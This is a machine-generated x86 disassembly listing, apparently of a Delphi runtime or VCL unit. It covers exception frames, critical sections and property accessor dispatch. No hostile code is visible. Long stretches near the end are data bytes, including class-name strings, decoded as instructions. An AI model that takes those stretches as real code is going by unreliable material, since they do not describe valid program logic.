mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404d60
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410270
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031a8
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4041f4
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407b88
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4102a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41030f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410316
retn
call sub_40fe54
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404f20
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_40e720
sub_410318
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4103b9
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4103c0
retn
mov eax rw-data
call sub_40fe24
mov eax sub_40e420
mov [ rw-data ] eax
mov eax sub_40e048
mov [ rw-data ] eax
mov edx sub_40df58
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e720
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fb18
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ea34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ed60
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f488
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4103c4
xchg esi eax
inc esi
add [ ebx + 0x640000ff ] ch
xchg esi eax
inc esi
add [ edi + edi * 8 - 0x699c0000 ] ch
inc esi
add [ ebp + 0x640000ff ] ch
xchg esi eax
inc esi
add [ esi + 0x640000ff ] ch
xchg esi eax
inc esi
add [ edi + 0x640000ff ] ch
xchg esi eax
inc esi
add [ eax + 0x640000ff ] dl
xchg esi eax
inc esi
add [ ecx + 0x640000ff ] dl
xchg esi eax
inc esi
add [ edx + 0x640000ff ] dl
xchg esi eax
inc esi
add [ ebx + 0x640000ff ] dl
xchg esi eax
inc esi
add [ edi + edi * 8 - 0x699c0000 ] dl
inc esi
add [ ebp + 0x640000ff ] dl
xchg esi eax
inc esi
add [ esi + 0x640000ff ] dl
xchg esi eax
inc esi
add [ edi + 0x640000ff ] dl
xchg esi eax
inc esi
add [ eax + 0x640000ff ] bl
xchg esi eax
inc esi
add [ ecx + 0x640000ff ] bl
xchg esi eax
inc esi
add [ edx + 0x640000ff ] bl
xchg esi eax
inc esi
add [ ebx + 0x640000ff ] bl
xchg esi eax
inc esi
add [ edi + edi * 8 - 0x699c0000 ] bl
inc esi
add [ ebp + 0x640000ff ] bl
xchg esi eax
inc esi
add [ esi + 0x640000ff ] bl
xchg esi eax
inc esi
add [ edi + 0x640000ff ] bl
xchg esi eax
inc esi
add [ eax + 0x640000ff ] al
xchg esi eax
inc esi
add [ ecx + 0x640000ff ] al
xchg esi eax
inc esi
add [ edx + 0x640000ff ] al
xchg esi eax
inc esi
add [ ebx + 0x640000ff ] al
xchg esi eax
inc esi
add [ edi + edi * 8 - 0x699c0000 ] al
inc esi
add [ ebp + 0x640000ff ] al
xchg esi eax
inc esi
add [ esi + 0x640000ff ] al
xchg esi eax
inc esi
add [ edi + 0x550000ff ] al
mov ebp esp
xor eax eax
push ebp
push sub_4104d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104d8
retn
sub_41051c
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410568
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410510
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407e90
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41051c
mov edx [ rw-data ]
mov eax esi
call sub_407b88
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407b88
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407e90
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_4105cc
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_41063c
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4106b0
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_41070c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410760
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_40422c
mov ecx esp
mov edx esi
mov eax ebx
call sub_41070c
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4107a8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410794
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4107e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410830
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4047bc
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41086c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410837
lea eax [ ebp - 0x4 ]
call sub_404670
retn
sub_410840
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410760
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_4107a8
pop ebx
retn
dec bl
je r-xdata
call sub_4107e8
jmp r-xdata
pop ebx
retn
sub_41086c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410932
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404218
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410840
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410939
lea eax [ ebp - 0xc ]
call sub_403f90
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4046ac
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410940
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410510
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410988 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410ab7 ]
jmp [ eax * 4 + jump_table_410a24 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_410b4c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410b38
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410b8c
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_410bc4
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_410c00
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4055e4
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410c74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410cba
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410cc1
retn
mov eax rw-data
call sub_403f90
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a0c
sub_410ccc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410cf1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410cf8
retn
sub_410ef0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edi ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
cmovno eax [ eax ]
or al 0x0
add [ eax ] al
dec eax
cmovno eax [ eax ]
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x72434645 ] cl
popad
je r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ edi + ecx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
cmovno eax [ eax ]
or al 0x0
add [ eax ] al
in al dx
push cs
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
adc [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x10
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al dx
push cs
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
outsd
jb r-xdata
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add ah dh
adc [ eax ] al
lea eax [ eax ]
cmp [ edi ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
cmovno eax [ eax ]
or al 0x0
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] dl
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004111 ] dh
add [ eax ] al
add [ eax + edx + 0x41 ] bl
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
outsd
jb r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dl
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
rcl [ eax + 0x10 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
adc [ ecx ] al
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] eax
or al 0x0
outsb
inc ebp
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x65727453 ] cl
popad
insd
inc ebp
jb r-xdata
inc eax
add ah dh
cmovno eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
add [ eax ] al
dec esi
outsd
je r-xdata
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
[ eax ] eax
pop eax
adc [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
adc [ ecx ] eax
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
rcl [ edx ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
adc al [ ecx ]
or al 0x0
xor [ eax ] eax
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
dec eax
cmovno eax [ eax ]
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
adc [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
adc [ ecx ] al
or al 0x0
adc [ ecx ] al
add [ eax ] al
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
add al dh
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc004112
add [ eax ] al
add [ esi + ebp * 2 ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
nop
or al 0x12
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx ] cl
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ edx ] 0x41
add [ eax + eax ] cl
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
lea eax [ eax ]
push 0x4112
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x12 ] ch
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or al 0x6e
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
adc eax [ ecx ]
adc [ eax ] al
add [ eax ] al
shr [ esi + 0x40 ] 0x1
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x12
outsd
jb r-xdata
dec ecx
outsb
jbe r-xdata
shl ah 0x14
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
adc al 0x41
add [ eax + eax ] ah
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ edx + edi ] dl
inc ecx
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
adc eax 0xc0041
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x500413b ] cl
push esp
inc edx
imul esi [ ebx + esi * 2 - 0x75 ] 0x4115a0c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
adc eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc eax 0x15ba0041
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
